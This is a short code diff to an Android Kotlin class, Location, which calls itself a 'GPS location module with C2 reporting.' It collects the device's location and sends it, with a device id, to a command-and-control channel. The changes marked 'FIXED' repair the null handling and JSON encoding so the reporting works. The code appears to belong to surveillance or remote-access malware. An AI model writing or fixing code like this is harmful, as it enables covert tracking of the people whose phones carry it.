@@ -9,13 +9,15 @@ import com.xrc.comms.ChannelClient
 import com.xrc.comms.Message
 import com.xrc.comms.Protocol
 import com.xrc.core.crypto.Identity
+import com.xrc.core.toJsonString
 
 /**
  * Location — GPS location module with C2 reporting.
  */
 class Location(
     private val context: Context,
-    private val channelClient: ChannelClient
+    // FIXED: nullable with default
+    private val channelClient: ChannelClient? = null
 ) {
     private val tracker = LocationTracker(context)
 
@@ -34,11 +36,13 @@ class Location(
             type = Protocol.TYPE_SENSOR_DATA,
             id = "loc_${System.currentTimeMillis()}",
             device_id = deviceId,
-            payload = Protocol.json.encodeToString(
-                mapOf("type" to "location", "data" to result)
-            )
+            // FIXED: Map<String, Any> → JSON via recursive helper
+            payload = mapOf(
+                "type" to "location",
+                "data" to result
+            ).toJsonString()
         )
-        channelClient.send(msg)
+        channelClient?.send(msg) // FIXED: null-safe
 
         return result
     }
